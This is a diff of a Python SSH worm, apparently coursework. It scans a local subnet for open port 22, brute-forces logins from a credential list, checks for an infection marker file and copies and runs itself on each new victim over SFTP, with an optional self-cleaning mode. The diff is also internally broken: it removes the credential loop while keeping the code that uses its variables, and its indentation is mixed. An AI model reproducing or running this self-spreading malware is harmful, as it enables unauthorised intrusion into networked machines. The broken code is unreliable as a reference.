@@ -180,17 +180,15 @@ def attackSystem(host):
 		# return a tuple containing an
 		# instance of the SSH connection
 		# to the remote system. 
-	
-	for (username, password) in credList:
 
 		if tryCredentials(host, username, password, ssh) == 0:
 
 			print("Worm is in...")
 
 			return (ssh, username, password)	
-			
+		else:
 	# Could not find working credentials
-	return None	
+			return None	
 
 ####################################################
 # Returns the IP of the current system
@@ -216,11 +214,11 @@ def getHostsOnTheSameNetwork():
 	# and return the list of discovered
 	# IP addresses.	
 	
-	portScan = nmap.portScan()
+	portScanner = nmap.PortScanner()
 
-	portScan.scan('192.168.1.0/24', arguments='-p 22 --open')
+	portScanner.scan( '10.0.0.0/24', arguments = '-p 22 --open' )
 
-	return portScan.all_hosts()
+	return portScanner.all_hosts()
 
 # If we are being run without a command line parameters, 
 # then we assume we are executing on a victim system and
@@ -232,105 +230,110 @@ def getHostsOnTheSameNetwork():
 # IP address and have the worm check the IP of the current
 # system against the hardcoded IP. 
 def main():
+
+    if len(sys.argv) < 2:
+
+        if isInfectedSystem():
+
+            sys.exit("Worm has been here...")
+
+
+    # Get the IP of the current system
+    currentSystemInterface = ""
+
+    for netFaces in netifaces.interfaces():
+
+        if netFaces == 'lo':
+
+            continue
+
+        else:
+
+            currentSystemInterface = netFaces
+
+            break
+
+    hostIP = getMyIP(currentSystemInterface)
+
+
+    # Get the hosts on the same network
+    networkHosts = getHostsOnTheSameNetwork()
+
+
+    # Remove the IP of the current system from the list of discovered systems.
+    networkHosts.remove(hostIP)
+
+    print("Found hosts: ", networkHosts)
+    
+    if "-c" in sys.argv or "--clean" in sys.argv:
+        # PRINT CLEANING AND RUN CLEANING FUNCTION
+        print("Cleaning worm.py...")
+
+        for host in networkHosts:
+
+            sshInfo = attackSystem(host)
+
+            if sshInfo:
+                print("Trying to spread to clean...")
+                try:
+                    remotepath = '/tmp/infected.txt'
+
+                    localpath = '/home/cpsc/'
+                    
+                    sftpClient = sshInfo[0].open_sftp()
+
+                    sftpClient.get(remotepath, localpath)
+
+                except IOError:
+
+                    spreadAndClean(sshInfo[0])
+
+                    print("Machine is cleaned...")
+
+                else:
+
+                    print("Cleaned...")
+
+    else:
+
+        # Go through the network hosts
+        for host in networkHosts:
 	
-	if len(sys.argv) < 2:
+            # Try to attack this host
+            sshInfo =  attackSystem(host)
+	
+            # Did the attack succeed?
+            if sshInfo:
 
-		if isInfectedSystem():
+                print("Worm is spreading...")
 
-			print("Worm got this machine already...")
+	        try:
+                    remotepath = '/tmp/infected.txt'
 
-			sys.exit()
-		else:
+    	            localpath = '/home/cpsc/'
 
-			infected_mark()
-		
-		# TODO: If we are running on the victim, check if 
-		# the victim was already infected. If so, terminate.
-		# Otherwise, proceed with malice. 
-		
+	            # Copy the file from the specified
+	            # remote path to the specified
+	            # local path. If the file does exist
+	            # at the remote path, then get()
+	            # will throw IOError exception
+	            # (that is, we know the system is
+	            # not yet infected).
+                    sftpClient = sshInfo[0].open_sftp()
 
-	# TODO: Get the IP of the current system
+	            sftpClient.get(remotepath, localpath)
 
-		currentInterface = ""
+	        except IOError:
 
-		for netfaces in netifaces.interface():
+		        # If the system was already infected proceed.
+		        # Otherwise, infect the system and terminate.
+		        # Infect that system
 
-			if netfaces == "lo":
-				
-				continue
-			else:
-				
-				currentInterface = netfaces
+	            spreadAndExecute(sshInfo[0])
 
-				break
+	        else:
 
-		myIP = getMyIP(currentInterface)
+	            print("Spreading complete")
 
-	# Get the hosts on the same network
-	networkHosts = getHostsOnTheSameNetwork()
-
-	# TODO: Remove the IP of the current system
-	# from the list of discovered systems (we
-	# do not want to target ourselves!).
-
-	networkHosts.remove(myIP)
-
-	print "Found hosts: ", networkHosts
-
-
-	if "-c" in sys.argv or "--clean" in sys.argv:
-
-		for host in networkHosts:
-
-			sshInfo = attackSystem(host)
-
-			if sshInfo:
-
-				try:
-					path = "/tmp/infected.txt"
-
-					localPath = "/home/cpsc/"
-
-					sftpClient = ssInfo[0]. open_sftp()
-					sftpClient.get(path, localPath)
-
-				except IOError:
-
-					spreadAndClean(sshInfo[0])
-					print("Cleaned the system")
-
-				else:
-					print("Cleaned")
-
-	else:
-
-	# Go through the network hosts
-		for host in networkHosts:
-			
-			# Try to attack this host
-			sshInfo =  attackSystem(host)
-			
-			print sshInfo
-			
-			
-			# Did the attack succeed?
-			if sshInfo:
-				
-				print "Trying to spread"
-
-				try:
-					path = "/tmp/infected.txt"
-
-					localPath = "home/cpsc/infected.txt"
-
-					sftpClient = sshInfo[0].open_sftp()
-
-					sftpClient.get(path, localPath)
-
-				except IOError:
-					print("Attempt to infect with worm")
-				
-				# Infect that system
-					spreadAndExecute(sshInfo[0])
-				
-					print "Spreading complete"
+if __name__ == "__main__":
+    main()
